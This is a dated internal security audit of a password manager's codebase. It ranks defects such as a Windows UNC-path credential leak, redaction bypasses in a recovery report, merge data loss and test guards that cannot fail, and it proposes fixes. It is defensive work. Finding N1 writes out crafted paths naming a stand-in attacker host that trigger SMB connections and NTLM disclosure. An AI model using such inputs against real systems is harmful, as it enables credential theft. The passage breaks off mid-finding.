# Subsystem audit — 2026-09-02

> The nine main-process subsystems that landed **after** `00-Security-Audit.md` swept the
> tree, plus the eleven renderer modules that landed with them. Read-only over `src/`;
> nothing was fixed. Point-in-time snapshot, not current reference.
>
> **Scope.** `src/main/{activity,attachments,breach,organisation,recovery,shell,sync,theme,totp}/`
> and `src/renderer/src/{activity,commands,content,export,generator,health,import,onboarding,organisation,settings,theme-studio}/`
> — every file, tests and CSS included. `breach/` got a disproportionate pass because it is
> the project's first and only network code.
>
> **What this audit did NOT re-cover:** everything in `00-Security-Audit.md`'s scope. That
> report's findings and its "checked and found fine" list still stand for the tree it swept.

---

## Summary

**The secret boundary held nearly everywhere it was tested directly.** The sync conflict
report carries no values, the breach client returns nothing that names a password or a hash,
the activity log has no field a secret could be assigned to, the TOTP module never echoes a
seed into an error, the organisation errors carry ids and counts only, and the import wizard
never receives a secret at all. The one exception is `recovery/`, where a message borrowed
from `assertValidHistory` interpolates an arbitrary string out of a corrupt file, and the
two-stage scrubber applied to it can be walked past two different ways — in a report whose
own printed text says it contains no secrets. _(Since fixed: the scrubber was removed rather
than repaired, and the report's disclosure sentence is now generated from a checked list. See
N2.)_

**`breach/` is well built.** The k-anonymity boundary is structural rather than conventional:
the transport's signature accepts five hex characters and nothing else, the off state is the
absence of a transport rather than a flag, no failure path can produce `safe`, and the
property tests that assert all of this plant real distinctive secrets in the positions they
guard and fault-inject to prove they bind. The findings against it are one genuine privacy
weakening (request ordering), three guards narrower than the rule they enforce, and a handful
of small things. **It is safe to wire up once N10, N15 and N17 are addressed** — see the
verdict below. _(N10 and N17 have since been fixed; N15 remains open and is currently harmless
because nothing constructs a client. See "Status, and how to read it".)_

**The pattern worth naming is guard vacuity.** Hard rule 9 is "ship the guard with the
system", and by and large this codebase does — several guards read here are the best-built
tests in the repository, with documented fault-injection records, and three of them
(`tray-model.test.ts:105-125`, `client.test.ts:534-547`, `properties.test.ts:363-386`) are
models of the form. But **at least ten** would survive the bug they claim to catch, and one of
those (`weakEntropyBits`) would survive a change that silently stops flagging weak passwords
on both devices. They are named individually in N2, N6, N8, N9, N27, N28, N33 and N39 — the
point of naming each is that a guard nobody has fault-injected is a guard nobody has tested.

**A note on reachability, because it drives the ranking.** Measured against
`src/main/ipc/register.ts` (58 handlers at the time, up from the 40 the first audit counted;
more have landed since — count them rather than trusting this) and
`src/main/index.ts`: **`shell/`, `attachments/`, `organisation/` and the renderer modules are
live** — `shell/` is imported by `index.ts:12`, the rest are reachable over `kh:attachments:*`,
`kh:folders:*`, `kh:tags:*` and `kh:organisation:*`. **`activity/`, `breach/`, `recovery/`,
`sync/`, `theme/` and `totp/` have no production caller at all** — `mergeDocuments`,
`diagnose()`, `createHttpsTransport` and `PwnedPasswordsClient` are each referenced only by
their own tests. So N1, N4 and N5 are live defects; N2 and N3 are armed but not yet connected.

**Findings are numbered N1–N39 and ranked high, medium, low, informational.** No critical.
Several of the low and informational entries group more than one related defect under a single
number, so the numbering is of findings and not of defects.

---

## Status, and how to read it

This page is a **dated snapshot**; the findings below are not. Each one that has since been
addressed carries a `STATUS:` line directly under its heading, and **a status line is only
written after someone has read the code and seen the fix** — never on the strength of a commit
message. An optimistic status column is worse than none, because it is the one thing that would
make this page actively misleading rather than merely old.

A finding with no `STATUS:` line is **outstanding**. The body of every finding is left exactly
as it was measured, including paths and line numbers that have since moved, because that is what
makes it a snapshot; where a fix went somewhere other than the proposed one, the status line says
so.

Marked fixed on the latest pass: **N1, N2, N3, N4, N7, N10, N11, N17, N18**, and **N38 in
half** — its kill-switch is built, its consent screen is not. **N15 was re-checked and is still
open**, and its status line says why it is currently harmless.

---

## Findings, by impact

### N1 — HIGH · A UNC path passes every check and reaches `statSync`, which on Windows is an outbound SMB connection and an NTLM handshake

**STATUS: FIXED.** Read `src/shared/model/local-path.ts`, `src/main/shell/file-open-request.ts:147` and `src/shared/ipc/validation.ts:214`. Both call sites now go through an allow-list of shapes that name local storage — a Windows drive letter plus a separator, or a single POSIX `/` and explicitly not a doubled one — so all five refused shapes in the table below are rejected before anything touches the filesystem. Recorded as decision D25 and in the threat model, because "opening a file cannot make a network connection" is a property a user is entitled to assume.

**Live code.** `src/main/shell/file-open-request.ts:118-142` → `src/main/shell/shell-controller.ts:115`

`parseFileOpenRequest` rejects non-strings, empty strings, control characters, URL schemes,
`..` segments, non-absolute paths and unknown extensions, then hands the survivor to
`isRegularFile`, which calls `statSync`. **Measured** by running the file's own three regexes
and `win32.isAbsolute`/`win32.extname` against candidate inputs:

```
\\attacker.example.com\share\evil.keep   -> reaches statSync: true
//attacker/share/evil.keep               -> reaches statSync: true
\Vaults\a.keep                           -> reaches statSync: true
```

`URL_SCHEME` is `/^[a-z][a-z0-9+.-]+:/i`, which requires two characters before the colon so
`C:\…` survives — a UNC path has no colon at all. `TRAVERSAL_SEGMENT` finds nothing.
`win32.isAbsolute` returns true for both UNC forms. `.keep` is a supported extension. So
control reaches the one check that touches the disk.

**What that gets an attacker.** On Windows a `stat` of a UNC path is an SMB operation: DNS
resolution, a TCP connection to port 445 on a host the attacker named, and an automatic
NTLMv2 authentication attempt carrying the user's domain, username and challenge-response.
Three things at once —

1. **An outbound network connection from an application whose hard rule 5 is "zero network by
   default"**, on a code path with no setting, no consent and no kill-switch;
2. **A credential disclosure.** The NTLMv2 response is offline-crackable and relayable. For a
   password manager, leaking the user's Windows credential to a chosen host is precisely the
   class of thing the product exists to prevent;
3. **A denial of service.** This is `statSync`, called synchronously from the `whenReady`
   path, so the SMB timeout blocks the main process before any window exists.

Delivery on Windows is any local process launching `Keyhold.exe \\attacker\share\x.keep`, a
crafted `.lnk` or `.url`, or an installer or script. On macOS the same string is
`isAbsolute`-true but macOS does not auto-mount, so `stat` returns ENOENT — **the impact is
Windows-specific** (reasoned from documented platform behaviour, not reproduced; what was
measured is only that the path reaches `statSync` unfiltered).

`\Vaults\a.keep` is a second, smaller version of the same gap: `win32.isAbsolute` accepts a
single leading backslash, which Windows resolves against the process's current drive. The
file's own header at `:34-36` gives ambient-process independence as the _reason_ for the
absolute check, so this one does not deliver what it promises.

**Fix.** After the `isAbsolute` check, add a `remote-path` member to the closed
`FileOpenRejection` union and reject: on `win32`, a value starting `\\` or `//` (both
normalise to UNC) and the `\\?\` / `\\.\` device namespaces; then additionally require
`/^[a-z]:[\\/]/i`. A vault on a network share deserves a deliberate, settings-gated decision,
not a side effect of an OS-supplied string. Guard it with the existing rejection table,
asserting `captured` stays empty.

**Fix N1 before wiring `second-instance` argv.** `shell-controller.ts:339-345`'s comment says
the single-instance lock hands the second process's argv to the first, but `index.ts:118-120`
currently ignores its `argv` parameter and only calls `focusMainWindow()`. Wiring it turns
"needs a crafted launch" into "any local process can trigger it".

**Related, same path:** `shell-controller.ts:115` uses `statSync`, which follows symlinks, so
a `.keep` symlink pointing at a UNC path passes `isRegularFile` too. Consider `lstatSync` plus
an explicit decision about whether symlinked vaults are supported.

---

### N2 — HIGH · The recovery report's redaction can be walked past two ways, in a report whose own text says it carries no secrets

**STATUS: FIXED, and the scrubber removed rather than repaired.** Read `src/main/recovery/history-detail.ts` and `src/main/recovery/text.ts`. `assertValidHistory`'s message is no longer borrowed at all: `history-detail.ts` composes the finding from literals plus values safe by construction — a count, a 1-based position, a length, or a field name taken from `VERSIONED_FIELDS` itself — so there is nothing to scrub. Both bypasses are regression tests in `document-diagnosis.test.ts`. `sanitiseDetail` remains only as a length backstop and its docblock says explicitly that nothing may rely on it for safety. Separately, the report's own disclosure sentence — which this finding pointed out was wrong — is now generated against `DISCLOSURE_WITHHELD` and `DISCLOSURE_CARRIED` in `report.ts`, with `report.test.ts` planting a separate marker per withheld category.

`src/main/recovery/document-diagnosis.ts:210`, against `src/main/recovery/text.ts:50` and
`:66`, and `src/main/recovery/report.ts:276`

```ts
redactUnknownFields(sanitiseDetail(message), VERSIONED_FIELDS);
```

`message` is borrowed from `assertValidHistory` (`src/main/history/versioning.ts:430`):

```ts
`${credential.id}: version ${n} snapshots "${key}", which it does not list as changed`;
```

`key` is an arbitrary `Object.keys()` string from a corrupt document. The module's own
comments (`text.ts:59-64`, `document-diagnosis.ts:200-202`) state plainly that this key
"could be a fragment of a decrypted note" — which is why `redactUnknownFields` exists.

**Measured**, by reproducing both functions standalone with `MAX_DETAIL_LENGTH = 200`:

- **Bypass A — truncation defeats the redactor.** `sanitiseDetail` runs _first_ and caps at
  200 characters. With a key of roughly 175 characters or more the closing `"` is truncated
  away, `/"([^"]*)"/g` finds no pair, and the message is returned **unmodified**. Observed:
  `r1: version 1 snapshots "RECOVERY-CODE-8891-RECOVERY-CODE-8891-…` — 174 characters of the
  key, verbatim.
- **Bypass B — a quote inside the key.** A key of the form `x" <content> "password` produces
  `r1: version 1 snapshots "…" <content> "password", which …` — the text _between_ the quote
  pairs is never scanned and leaks in full. **Reordering the two calls fixes A but not B**;
  I verified that too.

**What that gets an attacker, or an unlucky user.** `RecoveryReport` is explicitly designed to
be pasted into a public issue tracker, and `report.ts:276` prints:

> `This report contains no passwords, notes, titles, names, or file paths.`

while the object carries this string. The corrupt document that produces the key is the
_normal input_ to this subsystem — that is what recovery is for. So the disclosure needs no
attacker: a user whose vault got damaged runs diagnostics and pastes the output somewhere
public, on the strength of a sentence the report prints about itself.

**And the guard that would have caught it does not run.** `report.test.ts:158-168` sweeps a
richly poisoned fixture for a marker and is otherwise an excellent test — but
`poisonedDocument()`'s history holds `versionNumber: 2` followed by `1`, so
`assertValidHistory` throws on the strictly-ascending check (`versioning.ts:411`) before ever
reaching the snapshot-key check, and that message contains no user content at all. **The
`snapshots "${key}"` branch — the single reason `redactUnknownFields` exists — is never
executed by the report's own property test.** The only test of the redactor,
`document-diagnosis.test.ts:217-237`, uses an 18-character marker with no embedded quote, so
it cannot fail for either bypass.

**Fix.** Do not harden the regex; stop regex-scrubbing free text. Have `assertValidHistory`
throw a structured error (`{ recordId, versionNumber, reason: 'unlisted-snapshot-key', key }`)
and let `document-diagnosis.ts` compose its own detail, emitting `key` only when
`VERSIONED_FIELDS.includes(key)`. A regex scrubber has to win every time; an allow-list over
structured data only has to be right once. If the structured error is too large for this
slice, then as an interim: redact _before_ bounding, **and fail closed** — if the `"` count is
odd after the pair pass, drop the borrowed message entirely and emit `detail: null`. Then add
the two missing cases (a ≥200-character key, a key containing `"`) and give
`poisonedDocument()` a third version whose snapshot carries a marker-named key.

**Also fix the sentence.** `report.ts:276` is broader than the truth even with the redaction
working: the report deliberately carries the vault **basename** and every surveyed file's
basename (`report.ts:238`) and the **`vaultId`** (`report.ts:210`), and `HeaderSummary` holds
a `deviceId` (`file-inspection.ts:122`). All three are defensible, and `report.test.ts:126-128`
records the basename decision explicitly — but a user pasting this publicly hands over stable
correlatable identifiers and possibly a personal filename (`divorce-vault.keep`). Suggested:
"…no passwords, notes, record titles, folder or tag names, or directory paths. It does carry
file names and this vault's id."

---

### N3 — HIGH · A merge silently loses a record when either side holds a duplicate id — and it can lose a second, unrelated record

**STATUS: FIXED.** Read `assertUniqueIds` in `src/main/sync/merge-document.ts:305-340` and its tests in `merge-document.test.ts:336`. A merge now throws a named `DuplicateIdError` carrying the side, the entity and every offending id, on records, folders and tags, on all three inputs, before `indexRecords` runs. Refusing rather than resolving is decision D26; the reasoning against the two alternatives is recorded there and in `07-Sync-And-Merge/00-Merge-Engine.md` §3.

`src/main/sync/merge-values.ts:187-189` and `src/main/sync/merge-document.ts:222`

Two independent mechanisms, both measured by reading.

**(a) The index collapses duplicates.**

```ts
// merge-document.ts:222
return new Map(records.map((record) => [record.id, record]));
```

Two records with the same `id` and different content: the `Map` keeps the last. The earlier
one — a real credential with a real password — never enters `surviving` and is gone from the
output with no note, no conflict, and nothing in the report that names it.

**(b) `sameIdSet` assumes the list has no duplicates, and drops a healthy record when it does.**

```ts
// merge-values.ts:187
function sameIdSet(surviving: ReadonlySet<string>, list: readonly string[]): boolean {
  return list.length === surviving.size && list.every((id) => surviving.has(id));
}
```

With `surviving = {A, B}` and `ours.records.map(r => r.id) === ['A', 'A']`: `length === size`
(2 === 2) and every id is in `surviving`, so this returns true and `keep(ours)` returns
`['A', 'A']`. `merge-document.ts:175-177` maps that to `[recordA, recordA]` — **record B is
dropped and record A is emitted twice**. B need not be malformed in any way; it can be a
perfectly healthy credential that arrived from the other side and merged cleanly.

**Nothing rejects this input.** `assertValidCredential` is per-record and has no
document-level id-uniqueness check, and a record present on one side only
(`merge-document.ts:158`) is passed through unvalidated. Duplicate record ids are an explicitly
_recognised_ vault state — `src/main/recovery/document-diagnosis.ts:264-274` emits a
`duplicate-record-id` diagnostic for exactly this. So the codebase knows the state exists and
the merge engine does not defend against it. Reachable from a corrupt file, a bad import, or a
hostile `.keep` the user chose to merge.

The same shape exists for folders and tags (`merge-collections.ts:54-56`, `:149-160`) and for
keyed lists (`merge-values.ts:85-89`, `:158-169`). Custom fields and security questions are
saved by `assertValidCredential` throwing on duplicate ids at `merge-record.ts:443`; folders,
tags and records have no such backstop.

This is hard rule 6 — "never lose data" — and it is silent, which is the worst version.

**Fix.** Reject duplicates at the front door: in `mergeDocuments`, before anything else, assert
that `ours.records`, `theirs.records` and `base?.records` each have unique ids (and likewise
`folders`/`tags`), throwing the way `assertSameDocumentVersion` does — the caller is expected
to run diagnosis and repair first. Independently harden `sameIdSet` so it can never return a
list that omits a surviving id: `new Set(list).size === surviving.size && list.every(…)`. Add
a `SCENARIOS` entry with a duplicate id within one side; the property suite cannot see this
today.

---

### N4 — HIGH · Enabling quick unlock succeeds, and the UI tells the user it failed

**STATUS: FIXED.** Read `setQuickUnlock` in `src/renderer/src/settings/settings-gateway.ts:124-142`. It performs the enrol or revoke and then **re-reads the settings snapshot** instead of rejecting with `unavailable('read')`, so the toggle reports what actually happened. The comment at that call site records the original defect in both directions — the key existed while the user was told it did not, and the key was deleted while the toggle stayed reading "On".

**Live code.** `src/renderer/src/settings/settings-gateway.ts:124-132` →
`src/renderer/src/settings/use-settings.ts:127-136`

```ts
setQuickUnlock: async (enabled: boolean): Promise<SettingsSnapshot> => {
  const result = enabled
    ? await window.keyhold.session.enrolQuickUnlock()
    : await window.keyhold.session.revokeQuickUnlock();
  if (!result.ok) throw new Error(result.message);
  // The enrolment really has changed at this point; re-reading is what fails, because
  // `read` needs the channel that does not exist yet.
  return unavailable('read');
},
```

**Measured.** `unavailable('read')` rejects. `perform` catches it, sets `saveError` and
announces `"Not saved. Settings are not wired up yet…"`. The comment shows the author knew the
re-read would fail; what appears not to have been intended is that a _successful security
state change is reported to the user as a failure_. This is the one gateway method whose real
channel already exists, so it is reachable today.

**What that gets a user.** They turn quick unlock **on**, are told it was not saved, and walk
away believing no OS-keystore copy of the vault key exists — while one does. In the other
direction they press "Forget quick unlock" (`DangerZoneSection.tsx:151-159`), the key **is**
deleted, `perform` resolves `false`, the confirm dialog stays open and the UI still reads "On
for this vault". Both directions are the application misreporting a security state, which for
this product is a correctness bug with a security consequence rather than a UI wrinkle.

**Fix.** Do not call `unavailable('read')` after a successful side effect. The `perform`
contract already accepts `null` for "no new snapshot" — change
`SettingsGateway.setQuickUnlock` to return `SettingsSnapshot | null` and return `null` here,
or return the last known snapshot with `quickUnlock.enrolled` patched locally.

---

### N5 — MEDIUM · Two settings changes in flight lose the first one, silently, with a success announcement

**Live code.** `src/renderer/src/settings/use-settings.ts:144-164`

```ts
const updateMachine = useCallback(
  (patch, announceText) => {
    void perform(announceText, (target) => {
      const current = snapshot?.machine ?? DEFAULT_MACHINE_SETTINGS;
      const clamped = clampMachineSettings({ ...current, ...patch }); // a COMPLETE object
      return target.updateMachine(clamped);
    });
  },
  [perform, snapshot]
);
```

**Measured:** `snapshot` is captured in the closure and only refreshes when a reply lands, and
the value sent is a **complete** `MachineSettings`, not the patch. **Reasoned consequence:**
toggle "Lock on sleep" and then "Lock on blur" before the first IPC reply, and the second call
sends the pre-toggle `lockOnSleep: false` alongside `lockOnBlur: true`. Whichever reply lands
last becomes `snapshot`. The user hears **both** success announcements and one security
setting has silently reverted — which is exactly the failure the file's own header says it
exists to prevent ("invisible until someone reopens the screen and finds a different number").

The two switches are adjacent rows on `SecuritySessionSection`, so this is an ordinary
interaction, not an adversarial one. The same defect is in `updateVault` (`:155-164`), where
`HealthRulesSection.setRule` (`HealthRulesSection.tsx:63-73`) makes rapid consecutive writes
very likely — ticking two health rules quickly loses one.

**Fix.** Send the actual patch — `REQUIRED_CHANNELS` already declares
`Partial<MachineSettings>` — or hold the snapshot in a ref that `perform` updates so the
closure reads the latest, or serialise writes through a queue. The patch form is the smallest
and also the most correct.

---

### N6 — MEDIUM · Tag counts and tag filtering are broken: ids are compared against names

**Live code.** `src/renderer/src/organisation/selection.ts:216` and `:85`,
`src/renderer/src/organisation/TagFilterList.tsx:114` and `:153`

**Measured.** `CredentialProjection.tags` holds tag **names**, not ids. The authority is the
main process: `src/main/organisation/tag-ops.ts:150` iterates `for (const name of record.tags)`
and keys by `tagKey(name)`, `:169` looks up `counts.get(tagKey(tag.name))`, and
`src/main/vault/projection.ts:117` passes `credential.tags` through verbatim.

`organisation/` treats the same array as ids throughout:

```ts
// selection.ts:216 — keys the map by NAME; TagFilterList then reads it by tag.id
for (const tagId of record.tags) counts.set(tagId, (counts.get(tagId) ?? 0) + 1);
```

`TagFilterList.tsx:153` dispatches `onToggleTag(tag.id)`, which lands in `selection.tagIds`,
which `resolveSelection` puts into `FilterOptions.tagIds`, which
`src/shared/search/filter.ts:452` evaluates as `record.tags.includes(tagId)`. Both sides are
typed `readonly string[]`, so nothing fails to compile.

**What a user gets against a real vault:** every tag in the sidebar shows a count of 0, and
selecting any tag filter empties the list. Notably `activity/vault-statistics.ts:237` is the
one renderer module that got this right, and its docblock names `tag-ops.ts` as the authority.

**The guard is vacuous in the strict sense.** `src/shared/search/filter.test.ts:208,220` plants
`tags: ['tag-dev']` alongside a declared tag `{ id: 'tag-dev', name: 'Development' }` — a
fixture that puts an _id_ in a field the main process fills with a _name_. It cannot fail on
the bug it exists to catch.

**Fix.** Decide the representation once and enforce it at the type level. Cheapest correct
change: resolve at the sidebar boundary — key `countRecordsByTag` by `tagKey(name)`, have
`TagFilterList` look up `tagKey(tag.name)`, and have `resolveSelection` map `selection.tagIds`
through `context.tags` to names before building `FilterOptions`. The durable change is to
rename the field (`Credential.tagNames`) so a mix-up is a compile error, and to fix the
`filter.test.ts` fixture to carry names. This crosses into `@shared/search`, which is outside
this audit's scope — flagged, not traced further.

---

### N7 — MEDIUM · A breach sweep's request order is the vault's record order, which is a stable cross-session fingerprint the docs say it is not

**STATUS: FIXED.** Read `src/main/breach/client.ts:331` — `shuffleInPlace([...byPrefix])`, the project's CSPRNG-backed Fisher-Yates via `randomInt`'s rejection sampling, applied before any prefix is sent. Results are still returned in the caller's order. `client.test.ts` sweeps one fixed vault repeatedly and asserts the request sequences are not all identical while the prefix multiset and the caller-facing order are unchanged.

`src/main/breach/client.ts:292`, against the claim at `client.ts:32-33` and its documentation
face at `docs/05-Features/07-Breach-Check.md:28`

Both say, in the same words:

> …no title, no username, no URL, no record id, and **no ordering that would let requests be
> grouped back into one person's vault**.

**Measured:** `byPrefix` is a `Map` built by iterating `inputs` in order, and `#run` iterates it
with `for…of`, which is insertion order. So the sequence of prefixes leaving the machine is the
order records appear in the vault, unshuffled.

**What that gets an observer.** The service (or anyone on the path) sees N prefixes from one
address inside one paced window, so the _grouping_ the sentence denies happens trivially —
k-anonymity protects _which password within a prefix_, never _which set of prefixes belongs to
one user_. That much is inherent to the feature and is honestly recorded in the threat model.
What is **not** inherent, and is the actual finding, is that the _order_ is stable: the same
vault swept a month later from a different IP emits very nearly the same ordered sequence. An
ordered multiset of a few hundred 20-bit values is a strong linking handle. It turns "someone
checked something" into "this is the same vault as last month", which is a materially
different claim for a product positioned on being unobservable.

**Fix.** One import and one line: shuffle the prefix list with the project's own CSPRNG before
the loop. `shuffleInPlace` already exists at `src/main/crypto/random.ts:69`, routed through
`randomInt`'s rejection sampling, and is already used by the generator. Then correct both prose
sites: say that the service learns the multiset of prefixes and the request count, that the
order is randomised so it cannot be linked across sweeps, and that a VPN is the answer to the
address. Guard it by sweeping a fixed input twice and asserting the prefix sequences differ.

---

### N8 — MEDIUM · `checkMimeClaim` trusts a parser-selecting MIME claim, and its own comment says it cannot

`src/main/attachments/sniff.ts:212-226`

When `sniffFormat` recognises nothing, the `sniffed === null` branch keeps the caller's claim
and derives the preview kind from it, justified by the comment immediately above:

> Every claim that would pick a parser (`application/pdf`, `image/png`) is unreachable here:
> those have signatures, so a file claiming one without matching it is a `mismatch`, not an
> `unknown`.

**This is false, measured by reading both functions.** `mismatch` requires `sniffed !== null` —
it only fires when the bytes match some _other_ known signature. Bytes matching **nothing**
fall to `unknown`, and `previewKindForMime` (`:248-257`) then walks the same `FORMATS` registry:

| claim             | bytes match nothing → `stored` | `kind`        |
| ----------------- | ------------------------------ | ------------- |
| `application/pdf` | `application/pdf`              | **`pdf`**     |
| `image/png`       | `image/png`                    | **`image`**   |
| `application/zip` | `application/zip`              | **`archive`** |
| `image/svg+xml`   | `image/svg+xml`                | `other` ✓     |
| `text/html`       | `text/html`                    | `other` ✓     |

So an attacker-supplied file that fails every signature test still selects the PDF or image
viewer purely on its claim — the exact attack the module header says it exists to prevent. The
script-bearing formats are deliberately absent from `FORMATS` and stay safe, which is why this
is MEDIUM rather than HIGH. Note also that `sniffFormat` reads only the first 12 bytes while
pdf.js scans the first 1024 for `%PDF-`, so a PDF with a 100-byte prefix sniffs as unrecognised
and is stored on the claim alone.

**Currently latent:** a grep of `src/renderer` finds no consumer of `previewKindForMime` or
`AttachmentPreviewKind` — the preview UI is not built. That is the reason to fix it _now_,
before something is written against the comment's promise.

**Fix.** In the `sniffed === null` branch do not route through the registry: use a dedicated
allow-list of signature-free previewable types (`text/plain`, `text/csv` → `text`; everything
else → `other`), and consider `stored: UNKNOWN_MIME` for a claim whose type _is_ in `FORMATS`
— a signature-bearing format whose signature is absent is a lie, not an unknown. Ship the
guard: `expect(checkMimeClaim('application/pdf', NOTHING).kind).toBe('other')`. The only
`unknown`-branch test today (`sniff.test.ts:83-88`) uses `application/vnd.acme.thing`, which is
not in the registry — which is why this is invisible to the suite.

---

### N9 — MEDIUM · `weakEntropyBits` — the prose says one direction, the code does the other, and the test that claims to check it reads nothing back

`src/main/sync/merge-collections.ts:442` and `:508`, against
`src/main/sync/merge-collections.test.ts:331-342`

The policy paragraph at `:442` states "the **lower** `weakEntropyBits` threshold is taken …
every one of which resolves toward _more_ warning rather than less." The code at `:508` is
`Math.max(...)`. `src/main/health/rules.ts:376` is `if (bits < thresholds.weakEntropyBits)`, so
a **higher** threshold flags more passwords as weak — meaning `Math.max` is the correct
"more warning" direction and **the sentence is wrong**, contradicting its own stated intent
inside one paragraph.

That would be a doc nit if the guard bound. It does not. `:426-427` claims "a test walks this
table and asserts the implementation below actually moves in the direction named here", but
`POLICY_CASES` (`merge-collections.test.ts:248`) `Exclude`s `health`, and of health's three
fields only `enabledRules` (`:306`) and `expiringWithinDays` (`:321`) have direction
assertions. The `weakEntropyBits` test at `:331-342` passes 60 against 80 and asserts **only
that no conflict is reported** — it never reads the merged value back.

**So: change `:508` to `Math.min` to make the code agree with the comment and the entire suite
still passes**, while every merge silently lowers the weak-password threshold on both devices
and stops flagging passwords that were being flagged. That is a guard surviving exactly the bug
it exists to catch, on a security rule.

**Fix.** Correct the sentence at `:442` to "the _higher_ `weakEntropyBits` threshold", and add
`expect(merged.settings.health.weakEntropyBits).toBe(80)` in both argument orders to `:331`.

---

### N10 — MEDIUM · `no-network.test.ts`'s strongest check is defeated by writing the import in the project's own alias style

**STATUS: FIXED, and the file rewritten to parse rather than pattern-match.** Read `src/main/breach/no-network.test.ts`. Specifiers, identifiers and calls now come from the TypeScript parser — the same one that compiles the project — and the path aliases are read out of `tsconfig.node.json` itself rather than restated, so there is no second list to keep in step. The file's header records this bypass, its measured 14/14 pass, and the throwaway-source-tree test that plants it and asserts the scan fails.

`src/main/breach/no-network.test.ts:123-136`

```ts
const pattern = /(?:from|import)\s*\(?\s*'(\.[^']*)'/g;
```

`relativeImports` captures only specifiers beginning with `.`. The module-graph walk built on
it (`:139-151`) is described in the file header as the strongest of the three source checks —
"the capability is absent rather than unused" — because it proves `client.ts` cannot reach
`https-transport.ts` through any chain of imports.

**Measured:** `tsconfig.node.json:19` and `electron.vite.config.ts:15` both define an `@main/*`
alias to `src/main/*`, and `tools/alias-parity.test.ts` exists to keep them in sync, so the
aliases are a live, first-class convention — `client.ts:8` already imports
`@shared/model/breach.js`. An import written `from '@main/breach/https-transport.js'` resolves
correctly at build time and **is invisible to `relativeImports`**. The per-file `NETWORK_APIS`
scan does not save it either: `client.ts` would name `createHttpsTransport`, not `fetch`, and
`@main/breach/https-transport.js` contains no `://` so the `'a URL'` pattern does not fire.

The guard therefore fails open, silently, for an import written in the style the project uses
everywhere else. Everything else in this file is genuinely strong — the anchors at `:154-161`
that stop a vacuous empty scan, the `passwordRange` spy that separates "off" from "quiet", the
booby-trapped global. This one hole is worth closing before the feature ships.

**Fix.** Extend the pattern to capture `@main/…` and `@shared/…` specifiers and map them to
paths — or, simpler and stronger, walk the graph over the whole of `src/main/` rather than one
directory, resolving both relative and aliased specifiers.

---

### N11 — MEDIUM · Unmounting the import wizard never discards the plaintext file the main process is holding

**STATUS: FIXED.** Read `src/renderer/src/import/ImportWizard.tsx:56` and its cleanup effects. The component's header states the property — there is no path out of it that does not call `gateway.discard` — and `ImportWizard.test.tsx` asserts `discard:source-1` is called for a cancel on every step and again after `tree.unmount()`.

**Live code.** `src/renderer/src/import/ImportWizard.tsx:265-274`, against the claim at `:54-60`

**Measured.** `gateway.discard(sourceId)` is called only from `close()`, which is invoked from
the Cancel/Close buttons and `Modal`'s `onClose`. There is **no** unmount cleanup. The file
header states: _"There is no path out of this component that does not call `gateway.discard`."_
Unmounting is such a path, and so is the parent flipping `open` to `false` without routing
through `onClose`.

Concretely: a route change, a vault auto-lock that swaps the screen, or an error boundary above
the wizard leaves the main process holding the parsed contents of a competitor's export — "a
plaintext dump of somebody's passwords", in the file's own words — for the rest of the process
lifetime, with no renderer state left that could ever release it.

**Fix.** Add an unmount cleanup that discards the current `sourceId` via a ref, so the cleanup
does not re-run on every source change, and keep `close()` as it is.

---

### N12 — MEDIUM · The command palette survives a lock, sits over the unlock screen holding the typed query, and makes the password field inert

**Live code.** `src/renderer/src/commands/CommandsProvider.tsx:234-246` and
`src/renderer/src/commands/palette-store.ts:40-65`

**Measured.** `CommandsProvider` is mounted outside the screen switch (`App.tsx:83`,
deliberately, per its own comment). `paletteOpen` is only ever set false by `closePalette`,
called from the Modal's `onClose`. Nothing observes the session. `watchLockForRecents`
(`recent-commands.ts:81`) clears the recents list on lock — the palette's own open state is not
covered. `Modal` is a native `<dialog>` opened with `showModal()` (`chrome/Modal.tsx:9-20,69`),
so it sits in the top layer and **everything outside it is inert**.

Sequence: the palette is open, the user types `chase`, the window loses focus — `blur` is a real
lock reason (`activity-presentation.ts:58`) — the vault locks and the screen switches to
`UnlockScreen`. The palette stays painted over it with `chase` still in the field, and the
master-password input cannot be focused or typed into until Escape is pressed.

This is the disclosure `recent-commands.ts` was written to prevent, one level up — its own
docblock: _"a palette that still lists 'Go to Chase Bank' over an unlock screen has broken that
promise."_ The typed query is user-authored text that names a record.

**Fix.** Mirror `watchLockForRecents`: a `useSession.subscribe` in `palette-store.ts` that sets
`paletteOpen: false` (and `helpOpen: false`) on the unlocked→not-unlocked transition, wired
beside the existing subscription in `CommandsProvider`. The help sheet discloses nothing, but it
must not be a modal over the unlock form either.

---

### N13 — MEDIUM · A persisted `customPalette` is never re-validated, so the contrast floor and the "we wrote this string" invariant are both bypassable

`src/renderer/src/theme-studio/ThemeStudio.tsx:193` (the writer) →
`src/shared/theme/appearance.ts:218-224` and `:253` →
`src/renderer/src/theme/appearance-store.ts:31,66`

**The theme-studio path itself is clean.** Every value in `draft.palette` comes from
`normaliseColour(...).hex` (`theme-draft.ts:148,175,180`) or `normalisePalette` on an
already-validated `KeepTheme`, and `normaliseColour` (`keeptheme.ts:137-164`) accepts only
`#rgb`/`#rrggbb`/opaque `#rgba`/`#rrggbbaa`/`rgb()`/`rgba()` under 32 characters and
**re-serialises from parsed RGB**. `keeptheme.ts:49` states the invariant: _"The string that
eventually lands in `style.setProperty` is one we wrote."_

**That invariant is false on the persistence read path**, measured link by link. `applyToApp`
writes `customPalette` into `useAppearance`, which `JSON.stringify`s it to
`localStorage['keyhold.appearance']` (`appearance-store.ts:41`). On the next start `readStored()`
runs `coerceAppearance(JSON.parse(raw))`, whose only palette check is **completeness, not
validity**:

```ts
// appearance.ts:221
COLOUR_TOKENS.every(
  (token) => typeof candidate[token] === 'string' && candidate[token].trim() !== ''
);
```

`resolveAppearance` passes it through unchanged (`:156`) and `toCssVariables` →
`root.style.setProperty('--kh-color-<token>', value)` (`appearance-store.ts:66`) writes it
verbatim. That is the only `setProperty` call site in the renderer.

What this buys an attacker with write access to the user's profile directory — a live actor for
a local, offline password manager — or a corrupted settings file:

- **The legibility floor and the AA gate are bypassed entirely.** Everything the theme studio
  exists to guarantee — `admitPalette`, `ESCAPE_FLOOR_MINIMUM`, the "there is no override for
  this" copy at `ContrastReportPanel.tsx:73-79` — is enforced only at the studio, never on read.
  A palette of `var(--kh-color-bg)` values (a var chain, which `keeptheme.ts:38` says must be
  impossible precisely because _"a value that resolves at paint time cannot be
  contrast-checked"_) or of near-identical colours renders the app unreadable. Recovery exists
  (`useAppearance.reset()`) but is behind a Settings screen the user can no longer read — the
  exact scenario the floor was written to make impossible.
- **A `url()` value would reach a `background` shorthand and attempt a network fetch** — hard
